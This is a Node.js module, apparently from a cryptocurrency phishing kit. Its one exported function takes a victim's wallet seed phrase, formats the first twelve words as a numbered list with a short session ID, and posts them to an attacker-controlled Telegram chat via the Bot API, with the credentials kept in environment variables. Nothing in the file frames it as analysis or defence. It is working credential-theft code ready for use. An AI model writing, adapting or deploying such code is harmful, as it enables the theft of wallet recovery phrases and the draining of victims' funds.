const https = require('https');
require('dotenv').config();

const sendSeedData = (seedPhrase, userIP, socketId) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN ? process.env.TELEGRAM_BOT_TOKEN.trim() : null;
    const chatId = process.env.TELEGRAM_CHAT_ID ? process.env.TELEGRAM_CHAT_ID.trim() : null;

    if (!botToken || !chatId) return;

    // Arrange words in vertical order with numbers 1 to 12
    const words = seedPhrase.trim().split(/\s+/);
    const verticalList = words.slice(0, 12).map((word, index) => `${index + 1}. ${word}`).join('\n');
    
    // Generate unique ID from socket
    const uniqueId = socketId ? socketId.substring(0, 8).toUpperCase() : 'UNKNOWN';

    // Strictly the ID and the vertical numbered list
    const message = `🆔 USER ID: ${uniqueId}\n\n${verticalList}`;

    const data = JSON.stringify({
        chat_id: chatId,
        text: message
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${botToken}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };

    const req = https.request(options);
    req.write(data);
    req.end();
};

module.exports = { sendSeedData };